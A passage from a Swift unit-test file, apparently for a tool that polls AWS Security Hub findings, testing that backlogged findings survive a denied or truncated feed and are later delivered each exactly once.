        XCTAssertEqual(body["StartTime"] as? Int, Int(first.addingTimeInterval(-6 * 3_600).timeIntervalSince1970), "read from six hours before the last whole read")
        XCTAssertEqual(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.readUntil[feed] }, later)
        XCTAssertEqual(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.inARow.isEmpty }, true)
    }

    /// What one check had no room for stays owed through a later check that cannot read its feed whole, refused or cut
    /// short, however far newer findings have moved the watch on, and is handed over, each once, once the feed reads
    /// again.
    func testWhatIsOwedOutlastsAFeedThatCannotBeReadWhole() async throws {
        for failure in [TimedAWS.Mode.denied, .truncated] {
            let connection = try makeConnection()
            let accounts = [production, staging]
            let service = TimedAWS(accounts: accounts)
            let start = Date().addingTimeInterval(-13 * 3_600)
            var ids: [String] = []
            // Two accounts of 350, a minute apart in each, nearly six hours in all: more than one check returns, spread
            // so the watch moves past what is owed.
            for account in accounts {
                service.findings[account.id] = (0..<350).map { index in
                    let id = "arn:\(account.id):\(index)"
                    ids.append(id)
                    return .init(id: id, created: start.addingTimeInterval(Double(index) * 120), severity: "HIGH")
                }
            }
            var watch = AlertWatch()
            XCTAssertNil(watch.since(connection.id, at: start.addingTimeInterval(-60)))
            var delivered: [String] = []
            for poll in 1...4 {
                service.modes = poll == 2 ? ["securityhub": failure] : [:]
                let since = try XCTUnwrap(watch.since(connection.id, at: Date(), lookBack: AWS.adapter.alertLookBack))
                if poll == 2 { XCTAssertGreaterThan(since, start.addingTimeInterval(3_600), "newer findings have moved the watch past what is owed") }
                let found = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
                _ = watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack)
                delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
                if poll == 2, failure == .denied { XCTAssertTrue(found.contains { $0.id.hasPrefix("unreadable/securityhub/") }) }
                if poll == 2, failure == .truncated {
                    // Pages with nothing on them and a token are gone on with next time; what is owed waits, said once.
                    XCTAssertEqual(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.continuations.count }, accounts.count)
                    XCTAssertNotNil(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.told["more/backlog"] })
                }
            }
            XCTAssertEqual(delivered.count, ids.count, "\(failure): each once")
            XCTAssertEqual(Set(delivered), Set(ids.map(AWS.findingID)), "\(failure): the oldest too")
            XCTAssertTrue(delivered.contains(AWS.findingID(ids[0])))
            XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.owedFrom.isEmpty } ?? false)
        }
    }
}
